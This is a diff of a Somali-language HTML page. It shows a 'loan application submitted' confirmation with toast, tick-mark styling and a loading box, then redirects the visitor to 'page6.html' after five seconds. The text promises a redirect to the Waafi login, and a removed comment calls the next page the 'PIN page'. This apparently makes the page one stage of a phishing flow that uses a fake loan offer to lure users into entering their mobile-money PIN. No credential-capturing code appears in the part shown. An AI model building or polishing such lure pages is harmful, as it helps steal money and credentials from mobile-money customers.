@@ -2,53 +2,93 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Codsiga Waa La Gudbiyay</title>
+<title>Codsiga Gudbiyay</title>
 
 <style>
 
 body{
   margin:0;
-  font-family:Arial;
-  background:#f2f2f2;
+  font-family:Arial, sans-serif;
+  background:#f3f3f3;
   display:flex;
   justify-content:center;
-  align-items:center;
-  height:100vh;
 }
 
-.card{
-  width:90%;
+.wrapper{
+  width:100%;
   max-width:420px;
-  background:white;
-  border-radius:20px;
-  padding:30px;
+  padding:20px;
   text-align:center;
-  box-shadow:0 4px 15px rgba(0,0,0,0.1);
 }
 
-.check{
-  width:80px;
-  height:80px;
+/* TOP SUCCESS MESSAGE */
+.toast{
+  background:#1f2a38;
+  color:white;
+  padding:15px;
+  border-radius:12px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin-bottom:25px;
+}
+
+.toast .icon{
+  background:#4cd137;
+  width:28px;
+  height:28px;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-weight:bold;
+}
+
+/* GREEN TICK */
+.bigTick{
+  width:90px;
+  height:90px;
   background:#7ac943;
   border-radius:50%;
-  margin:auto;
+  margin:20px auto;
   display:flex;
   align-items:center;
   justify-content:center;
   color:white;
-  font-size:40px;
+  font-size:45px;
 }
 
-h2{
+/* TEXTS */
+h1{
   color:#7ac943;
+  font-size:26px;
+  margin-bottom:15px;
 }
 
+p{
+  color:#666;
+  line-height:1.6;
+  font-size:16px;
+}
+
+/* LOADING BOX */
 .loading{
-  margin-top:25px;
-  background:#eee;
-  padding:20px;
+  background:#ececec;
+  padding:18px;
   border-radius:12px;
+  margin-top:25px;
   color:#7ac943;
+  font-weight:bold;
+}
+
+/* BUTTON */
+.btn{
+  margin-top:20px;
+  border:2px solid #ddd;
+  padding:15px;
+  border-radius:12px;
+  color:#777;
+  font-size:16px;
 }
 
 </style>
@@ -56,26 +96,40 @@ h2{
 
 <body>
 
-<div class="card">
+<div class="wrapper">
 
-<div class="check">✓</div>
+<!-- TOP DARK MESSAGE -->
+<div class="toast">
+  <div class="icon">✓</div>
+  <div>🎉 Codsiga si guul leh ayaa loo gudbiyay!</div>
+</div>
 
-<h2>Codsiga Amaahda waa la gudbiyay</h2>
+<!-- BIG GREEN CHECK -->
+<div class="bigTick">✓</div>
+
+<h1>Codsiga Amaahda waa la gudbiyay</h1>
 
 <p>
-Codsigaaga amaahda waa la gudbiyay.  
-Fadlan sug ansixinta.
+Codsigaaga amaahda waa la gudbiyay. Fadlan sug ansixinta.
+</p>
+
+<p>
+Waxaad heli doontaa farriin xaqiijin ah. Hadda, soco Waafi.
 </p>
 
 <div class="loading">
 Ku celinaya galitaanka Waafi 4 ilbiriqsi...
 </div>
 
+<div class="btn">
+Tag Galitaanka Hadda
+</div>
+
 </div>
 
 <script>
 
-/* WAIT 5 SECONDS THEN OPEN PIN PAGE */
+/* AUTO MOVE AFTER 5 SECONDS */
 setTimeout(function(){
    window.location.href = "page6.html";
 },5000);
